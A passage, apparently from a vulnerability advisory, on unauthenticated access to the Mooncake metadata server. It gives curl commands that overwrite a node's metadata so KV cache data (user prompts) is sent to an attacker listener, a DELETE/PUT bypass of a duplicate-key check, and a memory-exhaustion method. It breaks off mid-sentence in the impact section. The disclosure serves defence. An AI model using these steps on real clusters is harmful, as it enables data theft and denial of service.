curl "http://192.168.105.123:28080/metadata?key=mooncake/ram/va"
# 2. save that JSON, change only "tcp_data_port" to 39999, put it back
curl -X PUT --data-binary @va_poisoned.json "http://192.168.105.123:28080/metadata?key=mooncake/ram/va"
# 3. run sender.py again as a fresh process
```

Observed: the sender prints `transfer returned 0`, the listener prints 88 bytes consisting of the 24-byte protocol header (including the target absolute address) followed by the 64-byte `SECRET_KV_...` payload, and victim A's buffer is unchanged - the payload was exfiltrated with neither endpoint reporting an error.

rpc_meta duplicate-check bypass:

```bash
curl -X PUT --data '{"ip_or_host_name":"8.8.8.8","rpc_port":9}' "http://192.168.105.123:28080/metadata?key=mooncake%2Frpc_meta%2Fva"   # 400 Duplicate rpc_meta key not allowed
curl -X DELETE "http://192.168.105.123:28080/metadata?key=mooncake%2Frpc_meta%2Fva"                                                 # 200
curl -X PUT --data '{"ip_or_host_name":"8.8.8.8","rpc_port":9}' "http://192.168.105.123:28080/metadata?key=mooncake%2Frpc_meta%2Fva" # 200
curl "http://192.168.105.123:28080/metadata?key=mooncake%2Frpc_meta%2Fva"                                                           # {"ip_or_host_name":"8.8.8.8","rpc_port":9}
```

Resource exhaustion: `PUT` a 900 KB body to 2800 distinct keys; the server process RSS grew from 39 MB to about 2.5 GB.

### Impact

This is a missing-authorization issue (CWE-306) on the cluster metadata control plane. The attacker needs no credentials, only reachability of the metadata server port, which is a fixed, operator-chosen port bound on all interfaces by default.

Confidentiality: KV cache data (user prompts and context) is exfiltrated to an attacker-controlled listener while both end
